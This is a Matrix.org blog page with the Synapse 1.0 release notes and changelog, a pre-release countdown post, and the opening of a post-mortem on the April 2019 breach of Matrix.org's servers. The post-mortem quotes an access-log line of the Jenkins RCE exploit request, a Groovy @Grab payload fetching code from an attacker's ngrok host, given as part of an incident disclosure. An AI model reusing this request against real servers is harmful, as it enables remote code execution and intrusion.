<p>Synapse 1.0 is the reference implementation of the <a href="https://matrix.org/docs/spec">Matrix 1.0 spec</a>. The goal of the release overall has been to focus on security and stability, such that we can officially declare Synapse (and Matrix) out of beta and recommended for production use. This means changing the default room protocol version used for new rooms to be <a href="https://github.com/matrix-org/matrix-doc/blob/37871106c6fc6013c17b5711fb93853fff140267/proposals/2002-rooms-v4.md">v4</a>, which includes the new <a href="https://github.com/matrix-org/matrix-doc/blob/f714aaadd011ac736d779f8460202a8d95799123/proposals/1442-state-resolution.md">state resolution algorithm</a>, as well as <a href="https://github.com/matrix-org/matrix-doc/blob/erikj/event_id_hashes/proposals/1659-event-id-as-hashes.md">collision-resistant event IDs</a>, which are now formatted to be <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/no_slash_in_event_id/proposals/1884-replace-slashes-in-event_ids.md">URL safe</a>.</p>
<p>Synapse 1.0 also ships with support for the upcoming <a href="https://matrix.org/docs/spec/rooms/v5.html">v5 room protocol</a> (which enforces honouring server key validity periods), but this will not be used as the default for new rooms until a sufficient number of servers support it.</p>
<p>Please note that Synapse 1.0 does <strong>not</strong> include significant performance work or new features - our focus has been almost exclusively on providing a reference implementation of the Matrix 1.0 protocol. But having cleared our backlog on security/stability issues we will finally be now unblocked to pursue work around reducing RAM footprint, eliminating forward-extremity build up, and shipping new features like Edits, Reactions &amp; E2E cross-signing support.</p>
<p>As part of the security work, Synapse 1.0 contains a <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything">breaking change</a> that requires a valid TLS certificate on the federation API endpoint. <strong>Servers that do not configure their certificate will no longer be able to federate post 1.0.</strong></p>
<p>It is also worth noting that Synapse 1.0.0 is the last release that will support Python 2.x and Postgres 9.4. For more information see <a href="/blog/2019/04/08/synapse-deprecating-postgres-9-4-and-python-2-x">here</a> but the TL;DR is that you should upgrade asap.</p>
<p>This release has been a long time coming. Many thanks indeed to everyone who helped test the release candidates and provided feedback along the way.</p>
<p>Synapse 1.0 is just one component of a larger Matrix 1.0 release, which you can <a href="/blog/2019/06/11/introducing-matrix-1-0-and-the-matrix-org-foundation">read all about here</a>.</p>
<p>As ever, you can get the new update <a href="https://github.com/matrix-org/synapse/releases/tag/v1.0.0">here</a> or any of the sources mentioned at <a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Note, Synapse is now available from PyPI, pick it up <a href="https://pypi.org/project/matrix-synapse/">here</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a></p>
<p>The changelog since 0.99.5 follows:</p>
<h1 id="synapse-1-0-0-2019-06-11">Synapse 1.0.0 (2019-06-11)</h1>
<h2 id="bugfixes">Bugfixes</h2>
<ul>
<li>Fix bug where attempting to send transactions with large number of EDUs can fail. (<a href="https://github.com/matrix-org/synapse/issues/5418">#5418</a>)</li>
</ul>
<h2 id="improved-documentation">Improved Documentation</h2>
<ul>
<li>Expand the federation guide to include relevant content from the MSC1711 FAQ (<a href="https://github.com/matrix-org/synapse/issues/5419">#5419</a>)</li>
</ul>
<h2 id="internal-changes">Internal Changes</h2>
<ul>
<li>Move password reset links to /_matrix/client/unstable namespace. (<a href="https://github.com/matrix-org/synapse/issues/5424">#5424</a>)</li>
</ul>
<h1 id="synapse-1-0-0rc3-2019-06-10">Synapse 1.0.0rc3 (2019-06-10)</h1>
<p>Security: Fix authentication bug introduced in 1.0.0rc1. Please upgrade to rc3 immediately</p>
<h1 id="synapse-1-0-0rc2-2019-06-10">Synapse 1.0.0rc2 (2019-06-10)</h1>
<h2 id="bugfixes-1">Bugfixes</h2>
<ul>
<li>Remove redundant warning about key server response validation. (<a href="https://github.com/matrix-org/synapse/issues/5392">#5392</a>)</li>
<li>Fix bug where old keys stored in the database with a null valid until timestamp caused all verification requests for that key to fail. (<a href="https://github.com/matrix-org/synapse/issues/5415">#5415</a>)</li>
<li>Fix excessive memory using with default <code>federation_verify_certificates: true</code> configuration. (<a href="https://github.com/matrix-org/synapse/issues/5417">#5417</a>)</li>
</ul>
<h1 id="synapse-1-0-0rc1-2019-06-07">Synapse 1.0.0rc1 (2019-06-07)</h1>
<h2 id="features">Features</h2>
<ul>
<li>Synapse now more efficiently collates room statistics. (<a href="https://github.com/matrix-org/synapse/issues/4338">#4338</a>, <a href="https://github.com/matrix-org/synapse/issues/5260">#5260</a>, <a href="https://github.com/matrix-org/synapse/issues/5324">#5324</a>)</li>
<li>Add experimental support for relations (aka reactions and edits). (<a href="https://github.com/matrix-org/synapse/issues/5220">#5220</a>)</li>
<li>Ability to configure default room version. (<a href="https://github.com/matrix-org/synapse/issues/5223">#5223</a>, <a href="https://github.com/matrix-org/synapse/issues/5249">#5249</a>)</li>
<li>Allow configuring a range for the account validity startup job. (<a href="https://github.com/matrix-org/synapse/issues/5276">#5276</a>)</li>
<li>CAS login will now hit the r0 API, not the deprecated v1 one. (<a href="https://github.com/matrix-org/synapse/issues/5286">#5286</a>)</li>
<li>Validate federation server TLS certificates by default (implements <a href="https://github.com/matrix-org/matrix-doc/blob/master/proposals/1711-x509-for-federation.md">MSC1711</a>). (<a href="https://github.com/matrix-org/synapse/issues/5359">#5359</a>)</li>
<li>Update /_matrix/client/versions to reference support for r0.5.0. (<a href="https://github.com/matrix-org/synapse/issues/5360">#5360</a>)</li>
<li>Add a script to generate new signing-key files. (<a href="https://github.com/matrix-org/synapse/issues/5361">#5361</a>)</li>
<li>Update upgrade and installation guides ahead of 1.0. (<a href="https://github.com/matrix-org/synapse/issues/5371">#5371</a>)</li>
<li>Replace the <code>perspectives</code> configuration section with <code>trusted_key_servers</code>, and make validating the signatures on responses optional (since TLS will do this job for us). (<a href="https://github.com/matrix-org/synapse/issues/5374">#5374</a>)</li>
<li>Add ability to perform password reset via email without trusting the identity server. (<a href="https://github.com/matrix-org/synapse/issues/5377">#5377</a>)</li>
<li>Set default room version to v4. (<a href="https://github.com/matrix-org/synapse/issues/5379">#5379</a>)</li>
</ul>
<h2 id="bugfixes-2">Bugfixes</h2>
<ul>
<li>Fixes client-server API not sending &quot;m.heroes&quot; to lazy-load /sync requests when a rooms name or its canonical alias are empty. Thanks to @dnaf for this work! (<a href="https://github.com/matrix-org/synapse/issues/5089">#5089</a>)</li>
<li>Prevent federation device list updates breaking when processing multiple updates at once. (<a href="https://github.com/matrix-org/synapse/issues/5156">#5156</a>)</li>
<li>Fix worker registration bug caused by ClientReaderSlavedStore being unable to see get_profileinfo. (<a href="https://github.com/matrix-org/synapse/issues/5200">#5200</a>)</li>
<li>Fix race when backfilling in rooms with worker mode. (<a href="https://github.com/matrix-org/synapse/issues/5221">#5221</a>)</li>
<li>Fix appservice timestamp massaging. (<a href="https://github.com/matrix-org/synapse/issues/5233">#5233</a>)</li>
<li>Ensure that server_keys fetched via a notary server are correctly signed. (<a href="https://github.com/matrix-org/synapse/issues/5251">#5251</a>)</li>
<li>Show the correct error when logging out and access token is missing. (<a href="https://github.com/matrix-org/synapse/issues/5256">#5256</a>)</li>
<li>Fix error code when there is an invalid parameter on /_matrix/client/r0/publicRooms (<a href="https://github.com/matrix-org/synapse/issues/5257">#5257</a>)</li>
<li>Fix error when downloading thumbnail with missing width/height parameter. (<a href="https://github.com/matrix-org/synapse/issues/5258">#5258</a>)</li>
<li>Fix schema update for account validity. (<a href="https://github.com/matrix-org/synapse/issues/5268">#5268</a>)</li>
<li>Fix bug where we leaked extremities when we soft failed events, leading to performance degradation. (<a href="https://github.com/matrix-org/synapse/issues/5274">#5274</a>, <a href="https://github.com/matrix-org/synapse/issues/5278">#5278</a>, <a href="https://github.com/matrix-org/synapse/issues/5291">#5291</a>)</li>
<li>Fix &quot;db txn 'update_presence' from sentinel context&quot; log messages. (<a href="https://github.com/matrix-org/synapse/issues/5275">#5275</a>)</li>
<li>Fix dropped logcontexts during high outbound traffic. (<a href="https://github.com/matrix-org/synapse/issues/5277">#5277</a>)</li>
<li>Fix a bug where it is not possible to get events in the federation format with the request <code>GET /_matrix/client/r0/rooms/{roomId}/messages</code>. (<a href="https://github.com/matrix-org/synapse/issues/5293">#5293</a>)</li>
<li>Fix performance problems with the rooms stats background update. (<a href="https://github.com/matrix-org/synapse/issues/5294">#5294</a>)</li>
<li>Fix noisy 'no key for server' logs. (<a href="https://github.com/matrix-org/synapse/issues/5300">#5300</a>)</li>
<li>Fix bug where a notary server would sometimes forget old keys. (<a href="https://github.com/matrix-org/synapse/issues/5307">#5307</a>)</li>
<li>Prevent users from setting huge displaynames and avatar URLs. (<a href="https://github.com/matrix-org/synapse/issues/5309">#5309</a>)</li>
<li>Fix handling of failures when processing incoming events where calling <code>/event_auth</code> on remote server fails. (<a href="https://github.com/matrix-org/synapse/issues/5317">#5317</a>)</li>
<li>Ensure that we have an up-to-date copy of the signing key when validating incoming federation requests. (<a href="https://github.com/matrix-org/synapse/issues/5321">#5321</a>)</li>
<li>Fix various problems which made the signing-key notary server time out for some requests. (<a href="https://github.com/matrix-org/synapse/issues/5333">#5333</a>)</li>
<li>Fix bug which would make certain operations (such as room joins) block for 20 minutes while attemoting to fetch verification keys. (<a href="https://github.com/matrix-org/synapse/issues/5334">#5334</a>)</li>
<li>Fix a bug where we could rapidly mark a server as unreachable even though it was only down for a few minutes. (<a href="https://github.com/matrix-org/synapse/issues/5335">#5335</a>, <a href="https://github.com/matrix-org/synapse/issues/5340">#5340</a>)</li>
<li>Fix a bug where account validity renewal emails could only be sent when email notifs were enabled. (<a href="https://github.com/matrix-org/synapse/issues/5341">#5341</a>)</li>
<li>Fix failure when fetching batches of events during backfill, etc. (<a href="https://github.com/matrix-org/synapse/issues/5342">#5342</a>)</li>
<li>Add a new room version where the timestamps on events are checked against the validity periods on signing keys. (<a href="https://github.com/matrix-org/synapse/issues/5348">#5348</a>, <a href="https://github.com/matrix-org/synapse/issues/5354">#5354</a>)</li>
<li>Fix room stats and presence background updates to correctly handle missing events. (<a href="https://github.com/matrix-org/synapse/issues/5352">#5352</a>)</li>
<li>Include left members in room summaries' heroes. (<a href="https://github.com/matrix-org/synapse/issues/5355">#5355</a>)</li>
<li>Fix <code>federation_custom_ca_list</code> configuration option. (<a href="https://github.com/matrix-org/synapse/issues/5362">#5362</a>)</li>
<li>Fix missing logcontext warnings on shutdown. (<a href="https://github.com/matrix-org/synapse/issues/5369">#5369</a>)</li>
</ul>
<h2 id="improved-documentation-1">Improved Documentation</h2>
<ul>
<li>Fix docs on resetting the user directory. (<a href="https://github.com/matrix-org/synapse/issues/5282">#5282</a>)</li>
<li>Fix notes about ACME in the MSC1711 faq. (<a href="https://github.com/matrix-org/synapse/issues/5357">#5357</a>)</li>
</ul>
<h2 id="internal-changes-1">Internal Changes</h2>
<ul>
<li>Synapse will now serve the experimental &quot;room complexity&quot; API endpoint. (<a href="https://github.com/matrix-org/synapse/issues/5216">#5216</a>)</li>
<li>The base classes for the v1 and v2_alpha REST APIs have been unified. (<a href="https://github.com/matrix-org/synapse/issues/5226">#5226</a>, <a href="https://github.com/matrix-org/synapse/issues/5328">#5328</a>)</li>
<li>Simplifications and comments in do_auth. (<a href="https://github.com/matrix-org/synapse/issues/5227">#5227</a>)</li>
<li>Remove urllib3 pin as requests 2.22.0 has been released supporting urllib3 1.25.2. (<a href="https://github.com/matrix-org/synapse/issues/5230">#5230</a>)</li>
<li>Preparatory work for key-validity features. (<a href="https://github.com/matrix-org/synapse/issues/5232">#5232</a>, <a href="https://github.com/matrix-org/synapse/issues/5234">#5234</a>, <a href="https://github.com/matrix-org/synapse/issues/5235">#5235</a>, <a href="https://github.com/matrix-org/synapse/issues/5236">#5236</a>, <a href="https://github.com/matrix-org/synapse/issues/5237">#5237</a>, <a href="https://github.com/matrix-org/synapse/issues/5244">#5244</a>, <a href="https://github.com/matrix-org/synapse/issues/5250">#5250</a>, <a href="https://github.com/matrix-org/synapse/issues/5296">#5296</a>, <a href="https://github.com/matrix-org/synapse/issues/5299">#5299</a>, <a href="https://github.com/matrix-org/synapse/issues/5343">#5343</a>, <a href="https://github.com/matrix-org/synapse/issues/5347">#5347</a>, <a href="https://github.com/matrix-org/synapse/issues/5356">#5356</a>)</li>
<li>Specify the type of reCAPTCHA key to use. (<a href="https://github.com/matrix-org/synapse/issues/5283">#5283</a>)</li>
<li>Improve sample config for monthly active user blocking. (<a href="https://github.com/matrix-org/synapse/issues/5284">#5284</a>)</li>
<li>Remove spurious debug from MatrixFederationHttpClient.get_json. (<a href="https://github.com/matrix-org/synapse/issues/5287">#5287</a>)</li>
<li>Improve logging for logcontext leaks. (<a href="https://github.com/matrix-org/synapse/issues/5288">#5288</a>)</li>
<li>Clarify that the admin change password API logs the user out. (<a href="https://github.com/matrix-org/synapse/issues/5303">#5303</a>)</li>
<li>New installs will now use the v54 full schema, rather than the full schema v14 and applying incremental updates to v54. (<a href="https://github.com/matrix-org/synapse/issues/5320">#5320</a>)</li>
<li>Improve docstrings on MatrixFederationClient. (<a href="https://github.com/matrix-org/synapse/issues/5332">#5332</a>)</li>
<li>Clean up FederationClient.get_events for clarity. (<a href="https://github.com/matrix-org/synapse/issues/5344">#5344</a>)</li>
<li>Various improvements to debug logging. (<a href="https://github.com/matrix-org/synapse/issues/5353">#5353</a>)</li>
<li>Don't run CI build checks until sample config check has passed. (<a href="https://github.com/matrix-org/synapse/issues/5370">#5370</a>)</li>
<li>Automatically retry buildkite builds (max twice) when an agent is lost. (<a href="https://github.com/matrix-org/synapse/issues/5380">#5380</a>)</li>
</ul>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;24&#x2F;final-countdown-to-1-0&#x2F;" title="Final countdown to 1.0">Final countdown to 1.0</a></h2>
                <span>
                    24.05.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>After lots of refinements, polishing and a few distractions we‚Äôre finally at the point of announcing the final timeline for both Matrix 1.0 and Synapse 1.0! We are targeting <strong>Monday 10th June</strong> as our release date - please consider this your two week warning!</p>
<p>This is the end game of the process we began back in February when we released the <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019">first stable release of the Server-Server API</a> at FOSDEM, and started the <a href="https://matrix.org/blog/2019/02/05/synapse-0-99-0">Synapse 0.99</a> release series to prepare for 1.0.</p>
<p>Matrix 1.0 refers to the upcoming set of API releases which provides a matched set of stable and secure APIs across all of Matrix - at which point the project (at last) exits beta! In practice, this will be Client-Server API 0.5 (including final membership lazy loading, E2E backups and interactive verification and lots more), SS API 0.2 (including server key validity period fixes and associated v5 room protocol) and any other spec updates. The next 2 weeks will see a flurry of spec activity as we get everything together - you can see the full list and track the progress for the CS 0.5 spec release at https://github.com/matrix-org/matrix-doc/projects/2.</p>
<p>Meanwhile, Synapse 1.0 will be the reference implementation of Matrix 1.0, and so makes the changes required to implement Matrix 1.0 and close all currently known security and stability issues and thus exit beta. This means changing the default room protocol version used for new rooms to be <a href="https://github.com/matrix-org/matrix-doc/blob/37871106c6fc6013c17b5711fb93853fff140267/proposals/2002-rooms-v4.md">v4</a>, which includes the new <a href="https://github.com/matrix-org/matrix-doc/blob/f714aaadd011ac736d779f8460202a8d95799123/proposals/1442-state-resolution.md">state resolution algorithm</a>, as well as <a href="https://github.com/matrix-org/matrix-doc/blob/erikj/event_id_hashes/proposals/1659-event-id-as-hashes.md">collision-resistant event IDs</a>, which are now formatted to be <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/no_slash_in_event_id/proposals/1884-replace-slashes-in-event_ids.md">URL safe</a>. <strong>Support for v4 rooms shipped in <a href="https://matrix.org/blog/2019/05/21/synapse-0-99-5-1-released">Synapse 0.99.5.1</a>, so please upgrade asap to 0.99.5.1 before 1.0 is released to ease the transition.</strong>. Synapse 1.0 will also ship with support for the upcoming v5 room protocol (which enforces honouring server key validity periods), but this will not used as the default for new rooms until sufficient servers are speaking Matrix 1.0.</p>
<p>As part of the security work, Matrix 1.0 and Synapse 1.0 also contains a <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything">breaking change</a> that requires a valid TLS certificate on the federation API endpoint. <strong>Servers that do not configure their certificate will no longer be able to federate post 1.0</strong></p>
<p>You can check that your server has been correctly configured <a href="https://federationtester.matrix.org/">here</a> and see <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">here</a> for more info on what you need to do. If in doubt head to <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>We've been tracking readiness for the certificate change at https://arewereadyyet.com, at the time of writing 68% of active <em>servers</em> on the federation have valid certificates. We obviously would want that number to be higher, however since the largest installations <em>have</em> upgraded the total number of <em>users</em> who are ready for 1.0 stands at 96%, which we consider to be high enough to release 1.0.</p>
<p><img src="/blog/img/awry.2019-05-24.png" alt="" /></p>
<p><strong>This is not a drill</strong>, from here until 10th June we need everyone to not only ensure that their own server is ready, but also to encourage their fellow admins to update as well. With your help we can get everyone over the line!</p>
<p>Thanks everyone for your help to date, especially those providing support in <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>Onwards!</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;" title="Post-mortem and remediations for Apr 11 security incident">Post-mortem and remediations for Apr 11 security incident</a></h2>
                <span>
                    08.05.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <h3 id="table-of-contents">Table of contents</h3>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#introduction">Introduction</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#history">History</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-incident">The Incident</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-defacement">The Defacement</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-rebuild">The Rebuild</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#remediations">Remediations</a>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh">SSH</a>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-keys-should-give-minimal-access">SSH keys should give minimal access</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#two-factor-authentication">Two factor authentication</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</a></li>
</ul>
</li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#network-architecture">Network architecture</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#keeping-patched">Keeping patched</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#intrusion-detection">Intrusion detection</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#incident-management">Incident management</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#configuration-management">Configuration management</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#secure-packaging">Secure packaging</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#dev-and-ci-infrastructure">Dev and CI infrastructure</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</a></li>
</ul>
</li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#conclusion">Conclusion</a></li>
</ul>
<h3 id="introduction">Introduction</h3>
<p>Hi all,</p>
<p>On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via <a href="https://twitter.com/matrixdotorg/status/1116304867683905537">Twitter</a> and our <a href="https://matrix.org/blog/2019/04/11/security-incident/">blog</a>, but in this post we‚Äôll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.</p>
<p>Firstly, please understand that <strong>this incident was not due to issues in the Matrix protocol itself or the wider Matrix network</strong> - and indeed everyone who wasn‚Äôt on the Matrix.org server should have barely noticed.  If you see someone say ‚ÄúMatrix got hacked‚Äù, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but <strong>the protocol and network itself was not impacted</strong>.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but <strong>this incident was not related to the protocol</strong>.</p>
<p>Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.</p>
<p>In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.</p>
<p>This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)</p>
<p>Meanwhile, if you think that the world needs Matrix, <strong>please</strong> consider supporting us via <a href="https://patreon.com/matrixdotorg">Patreon</a> or <a href="http://liberapay.com/matrixdotorg">Liberapay</a>.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like <a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> (E2EE compatibility for all Matrix clients/bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.</p>
<p>Finally, if you happen across security issues in Matrix or matrix.org‚Äôs infrastructure, please please consider disclosing them responsibly to us as per our <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a>, in order to help us improve our security while protecting our users.</p>
<h3 id="history">History</h3>
<p>Firstly, some context about Matrix.org‚Äôs infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.</p>
<p>The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our <a href="https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/">funding situation</a> at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on <a href="https://upcloud.com">UpCloud</a>, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot/Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.</p>
<p>In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn‚Äôt spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn‚Äôt tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we‚Äôd got this right in the past, we‚Äôd be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.</p>
<p>Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.</p>
<p>Lots of stuff then happened over the following months - we <a href="https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/">secured funding</a> in Jan 2018; the French Government began talking about <a href="https://matrix.org/blog/2018/04/26/matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app/">switching to Matrix</a> around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).</p>
<p>Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out <a href="https://modular.im">Modular.im</a> as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).</p>
<p>So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the <a href="https://fastjetperformance.com/podcasts/how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance/">normalisation of deviance</a> - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.</p>
<h3 id="the-incident">The Incident</h3>
<p>The first evidence of things going wrong was a tweet from <a href="https://twitter.com/JaikeySarraf">JaikeySarraf</a>, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.</p>
<p>In this process, we spotted an unrecognised SSH key in <code>/root/.ssh/authorized_keys2</code> on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure <code>authorized_keys2</code> file (a legacy location from back when OpenSSH transitioned from <a href="https://searchsecurity.techtarget.com/tip/An-introduction-to-SSH2">SSH1-&gt;SSH2</a>).  Further inspection showed that 19 hosts in total had the same key present in the same place.</p>
<p>At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:</p>
<ul>
<li>The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - <a href="https://www.exploit-db.com/exploits/46572">https://www.exploit-db.com/exploits/46572</a>):</li>
</ul>
<p><code>matrix.org:443 151.34.xxx.xxx - - [13/Mar/2019:18:46:07 +0000] &quot;GET /jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://5f36xxxx.ngrok.io/jenkins/%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP/1.1&quot; 500 6083 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;</code></p>
<ul>
